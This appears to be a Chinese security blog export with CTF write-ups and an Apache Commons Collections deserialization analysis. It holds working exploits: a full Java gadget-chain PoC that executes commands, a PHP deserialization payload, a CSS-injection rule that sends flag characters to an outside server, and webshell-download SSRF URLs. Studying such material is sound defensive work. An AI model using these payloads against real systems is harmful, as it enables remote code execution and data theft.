<p>题目提示源码泄露，拿到的源码通过upload函数可以看出其实是四个字段的..</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$array = <span class="keyword">array</span>();</span><br><span class="line">$array[<span class="string">"title"</span>] = $fileinfo[<span class="string">'title'</span>];</span><br><span class="line">$array[<span class="string">"filename"</span>] = $fileinfo[<span class="string">'filename'</span>];</span><br><span class="line">$array[<span class="string">"ext"</span>] = $fileinfo[<span class="string">'ext'</span>];</span><br><span class="line">$img_ext = getimagesize($_FILES[$input][<span class="string">"tmp_name"</span>]);</span><br><span class="line">$my_ext = <span class="keyword">array</span>(<span class="string">"width"</span>=&gt;$img_ext[<span class="number">0</span>],<span class="string">"height"</span>=&gt;$img_ext[<span class="number">1</span>]);</span><br><span class="line">$array[<span class="string">"attr"</span>] = serialize($my_ext);</span><br></pre></td></tr></table></figure>

<p>但是我正常去注入的话一直在回显error，其实是五个字段…，从比赛的源码也可以看出泄露的和正在运行的确实是不太一样的</p>
<p>后来就感觉…注入肯定是没有问题的，就又多加了一个字段，结果成了…</p>
<p>当时想着注入进去，那肯定直接拿flag了，结果并没有..</p>
<p>后来才意识到自己的错误，我注入进去的数据是经过url编码的数据</p>
<p>在平时我们传入url编码的payload是会经过浏览器去处理的，也就是会解码一遍，而这个直接注入进去，burpsuite并不会给文件名自动解码，所以无法反序列化拿到flag,但是这里确实有个protected变量要去处理，结合insert插入16进制编码后的字符串，我们可以直接插入payload的十六进制，这样就可以处理protected变量了</p>
<p>exp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span> </span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> $ifview = <span class="keyword">True</span>; </span><br><span class="line">	<span class="keyword">protected</span> $config = <span class="string">"/flag"</span>;</span><br><span class="line">	<span class="comment">// The function is not yet perfect, it is not open yet.</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="comment"># Read some config html</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;view_files(<span class="keyword">$this</span>-&gt;config);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$c=<span class="keyword">new</span> helper;</span><br><span class="line"><span class="keyword">echo</span> bin2hex(serialize($c));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><a href="https://imgse.com/i/Quc6T1" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/12/02/Quc6T1.md.png" alt="Quc6T1.md.png"></a></p>
<p>访问下show.php触发一下，拿到flag.</p>
<h3 id="cssgame"><a href="#cssgame" class="headerlink" title="cssgame"></a>cssgame</h3><p>这道题…可能当时没吃饭有点昏，当时简直就是人间迷惑行为…我竟然想去闭合双引号？？？</p>
<p>link标签</p>
<p><a href="https://imgse.com/i/Quvx0A" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/12/02/Quvx0A.md.png" alt="Quvx0A.md.png"></a></p>
<p>当然这里的href不仅可以引入内部css，还可以去引入外部css，比如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xx&#x2F;1.css</span><br></pre></td></tr></table></figure>

<p>可以想到之前Smi1e师傅的css注入文章..那接下来就很简单了…</p>
<p>vps上写个test.css，内容如下</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[name=<span class="string">"flag"</span>]</span><span class="selector-attr">[value^=<span class="string">"b"</span>]</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">"http://139.224.236.99:8967/b"</span>);&#125;</span><br></pre></td></tr></table></figure>

<p>题目提交<a href="http://vps/test.vss,服务器上监听一下端口" target="_blank" rel="noopener">http://vps/test.vss,服务器上监听一下端口</a></p>
<p><img src="https://s2.ax1x.com/2019/12/02/Qux5jg.png" alt="Qux5jg.png"></p>
<p>剩下的字符自动化或者手动探测一下就可以了</p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache Common Collections 反序列化分析学习</title>
    <url>/2020/05/13/Apache-Common-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>状态有点不好 感觉对什么都提不起来兴趣…希望能快点好吧..</p>
<h3 id="漏洞组件"><a href="#漏洞组件" class="headerlink" title="漏洞组件"></a>漏洞组件</h3><p>Apache Commons Collections 是一个扩展了Java标准库里的Collection结构的第三方基础库</p>
<p>漏洞版本&lt;=3.2.1</p>
<p>起一个maven项目,pom.xml内容如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>2<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>war<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>Common-Collections Maven Webapp<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.apache.org<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">finalName</span>&gt;</span>Common-Collections<span class="tag">&lt;/<span class="name">finalName</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="漏洞基础利用"><a href="#漏洞基础利用" class="headerlink" title="漏洞基础利用"></a>漏洞基础利用</h4><p>主要漏洞利用点在InvokerTransformer.class的transform方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class cls = input.getClass();</span><br><span class="line">                Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' does not exist"</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' cannot be accessed"</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException var7) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' threw an exception"</span>, var7);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出传参一个Object，然后通过反射进行任意的方法调用，定位下iMethodName和iParamTypes变量</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">    <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">    <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到在初始化类的时候进行了变量的定义，所以这些都是我们可控的地方，也就是可以通过InvokerTransformer类进行任意类任意方法的调用。</p>
<p>但是仅仅这样无法满足java的命令执行，对于PHP而言,只需要简单的system(‘xx’)这样的函数形式即可执行命令，但对于Java来讲命令执行通常为：Runtime.getRuntime().exec(cmd),所以我们必须要进行多次调用，把第一次调用后的结果传给后面一直执行，所以这里是需要多次调用transform方法才可以达到命令执行的目的，所以要找一个可以多次调用transform的函数</p>
<p>ChainedTransformer.class</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">        object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>构造函数会把传进来的对象数组赋值给iTransformers变量，可以看到这里可以通过循环把每一次通过transform得到object作为参数再传给下一次使用，这样就符合了我们之前需要达到的要求.</p>
<p>看一下简单利用的poc</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo1</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",</span><br><span class="line">                        new Class[] &#123;String.class, Class[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>,</span><br><span class="line">                        new Class[] &#123;Object.class, Object[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String<span class="class">.<span class="keyword">class</span> &#125;,</span></span><br><span class="line">                        new Object[] &#123;"calc.exe"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        transformerChain.transform(<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里主要解释下对于getMethod的反射为什么是两个class (String.class和class[].class)，翻下getMethod函数的源码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@CallerSensitive</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Method <span class="title">getMethod</span><span class="params">(String name, Class&lt;?&gt;... parameterTypes)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> NoSuchMethodException, SecurityException </span>&#123;</span><br><span class="line">    checkMemberAccess(Member.PUBLIC, Reflection.getCallerClass(), <span class="keyword">true</span>);</span><br><span class="line">    Method method = getMethod0(name, parameterTypes, <span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (method == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchMethodException(getName() + <span class="string">"."</span> + name + argumentTypesToString(parameterTypes));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> method;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到如果需要反射getMethod方法，需要两个参数第一个自然就是String.class，第二个参数是可变数量的泛型class，所以第二个需要传参Class[].class ，同理，invoke也是如此，就不再赘述了。</p>
<h4 id="进阶反序列化"><a href="#进阶反序列化" class="headerlink" title="进阶反序列化"></a>进阶反序列化</h4><p>上面介绍的只是一些主要的触发点，如果要达到反序列化直接触发的话，还是差一些的，我们需要的是直接通过readObject触发，上面的话还需要再调用一次transform方法，所以需要找到一些调用链来使得tranform自动调用</p>
<p>LazyMap.class</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">LazyMap</span><span class="params">(Map map, Transformer factory)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Factory must not be null"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.factory = factory;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">            Object value = <span class="keyword">this</span>.factory.transform(key);</span><br><span class="line">            <span class="keyword">super</span>.map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">super</span>.map.get(key);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对于LazyMap的构造函数，如果第二个参数是Transformer类，则会将这个参数赋值给factory变量给下面的get方法进行使用.</p>
<p>在LazyMap的get函数中，如果map中不包含传进来的键值的话，则会调用this.factory的transform方法，所以这里可以将factory设置为ChainedTransformer类，这样我们就可以控制factory了，接下来找下get方法的调用</p>
<p>TiedMapEntry.class</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.map.get(<span class="keyword">this</span>.key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很明显可以看出 this.map和我们的lazymap很合适，接着找下getValue的调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.getKey() + <span class="string">"="</span> + <span class="keyword">this</span>.getValue();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>java的toString其实是和php一样的，当对象被当作字符串调用时，触发toString</p>
<p>其实这里如果把反序列化后的对象直接打印出来，确实可以触发，但是还是不算直接触发，这里可以找一个重写过的readObject方法完成这个操作：</p>
<p>BadAttributeValueExpException.class</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">   <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">       ObjectInputStream.GetField gf = ois.readFields();</span><br><span class="line">       Object valObj = gf.get(<span class="string">"val"</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (valObj == <span class="keyword">null</span>) &#123;</span><br><span class="line">           val = <span class="keyword">null</span>;</span><br><span class="line">       &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">           val= valObj;</span><br><span class="line">       &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="keyword">null</span></span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">           val = valObj.toString();</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">           val = System.identityHashCode(valObj) + <span class="string">"@"</span> + valObj.getClass().getName();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>取出val变量，进行一系列字符串操作，如果我们把这个val变量设置为TiedMapEntry类的话，在程序运行到if(valObj == null)的时候就会触发toString，完成一系列调用,不过这个val变量是私有的，需要通过反射来进行设置变量，最终完整poc如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.HashedMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[]&#123; String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[]&#123; Object.class, Object[].class&#125;, new Object[]&#123; null ,new Object[0]&#125; ),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String<span class="class">.<span class="keyword">class</span> &#125;,</span></span><br><span class="line">                        new Object[] &#123;"calc.exe"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">"lih3iu"</span>);</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException ins = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        Field valfield = ins.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        valfield.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        valfield.set(ins, entry);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream exp = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(exp);</span><br><span class="line">        oos.writeObject(ins);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        ByteArrayInputStream out = <span class="keyword">new</span> ByteArrayInputStream(exp.toByteArray());</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(out);</span><br><span class="line">        Object obj = (Object) ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h4><ul>
<li>通过取出val中的TiedMapEntry</li>
<li>触发toString函数</li>
<li>触发getValue函数</li>
<li>触发<code>this.map.get(this.key)</code> Map类为lazymap,key随意</li>
<li>触发this.factory.transform(key)，factory为ChainedTransformer类</li>
<li>最终执行命令</li>
</ul>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.smi1e.top/java反序列化学习之apache-commons-collections/" target="_blank" rel="noopener">https://www.smi1e.top/java%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e5%ad%a6%e4%b9%a0%e4%b9%8bapache-commons-collections/</a></p>
<p><a href="https://xz.aliyun.com/t/4711" target="_blank" rel="noopener">https://xz.aliyun.com/t/4711</a></p>
<p><a href="https://xz.aliyun.com/t/4558#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/4558#toc-0</a></p>
]]></content>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>2019红帽杯线下题目漏洞分析</title>
    <url>/2019/11/26/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%E7%BA%BF%E4%B8%8B%E9%A2%98%E7%9B%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近的状态一直很差，每天都沉浸在一种很难受的情绪，大概持续了三个星期左右，导致精神状态每天都特别差，这段时间也没有怎么学习，红帽杯打的也不太理想，题目也都比较基础，可惜没都做出来，打到下午三点左右..状态差到快睡着了….，这篇文章是这场线下的一些个人总结，也是新的学习生活的开始(每次都要靠剪卡尺来摆脱某些感情问题…真希望以后不会被感情问题所困扰…做一个莫得感情的人吧，emm，这应该真的是最后一次尝试了，不过失败的有点可笑，还是专心于做事吧，少想一些有的没的)</p>
<h3 id="粤湾基金"><a href="#粤湾基金" class="headerlink" title="粤湾基金"></a>粤湾基金</h3><p>题目本身存在Tp5的rce，感觉大家都是TPscan一把梭的，当时做出来了就没怎么审这道题的源码，看放的wp，还是存在很多漏洞的，这里说一下</p>
<h4 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h4><p>Home\Controller\test.php中dlfile函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dlfile</span><span class="params">($file_url, $save_to)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_POST, <span class="number">0</span>); </span><br><span class="line">        curl_setopt($ch,CURLOPT_URL,$file_url); </span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); </span><br><span class="line">        $file_content = curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        $downloaded_file = fopen($save_to, <span class="string">'w'</span>);</span><br><span class="line">        fwrite($downloaded_file, $file_content);</span><br><span class="line">        fclose($downloaded_file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数看起来有点像内置后门，我们可以控制两个参数，可以控制curl的对象和返回结果储存的地方</p>
<p>源码中还贴心的给了payload(- -</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; &#x2F;Home&#x2F;Test&#x2F;dlfile?file_url&#x3D;http:&#x2F;&#x2F;xxxx&#x2F;shell.txt&amp;save_to&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&#x2F;&#x2F;&#x2F;Home&#x2F;Test&#x2F;dlfile?file_url&#x3D;file:&#x2F;&#x2F;&#x2F;flag&amp;save_to&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.txt</span><br></pre></td></tr></table></figure>

<h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><p>Home\Controller\Uploadify.php中preview函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">preview</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="comment">// 此页面用来协助 IE6/7 预览图片，因为 IE 6/7 不支持 base64</span></span><br><span class="line">		$DIR = <span class="string">'preview'</span>;</span><br><span class="line">		<span class="comment">// Create target dir</span></span><br><span class="line">		<span class="keyword">if</span> (!file_exists($DIR)) &#123;</span><br><span class="line">			@mkdir($DIR);</span><br><span class="line">		&#125;</span><br><span class="line">	$cleanupTargetDir = <span class="keyword">true</span>; <span class="comment">// Remove old files</span></span><br><span class="line">	$maxFileAge = <span class="number">5</span> * <span class="number">3600</span>; <span class="comment">// Temp file age in seconds</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($cleanupTargetDir) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!is_dir($DIR) || !$dir = opendir($DIR)) &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'&#123;"jsonrpc" : "2.0", "error" : &#123;"code": 100, "message": "Failed to open temp directory."&#125;, "id" : "id"&#125;'</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">while</span> (($file = readdir($dir)) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">			$tmpfilePath = $DIR . DIRECTORY_SEPARATOR . $file;</span><br><span 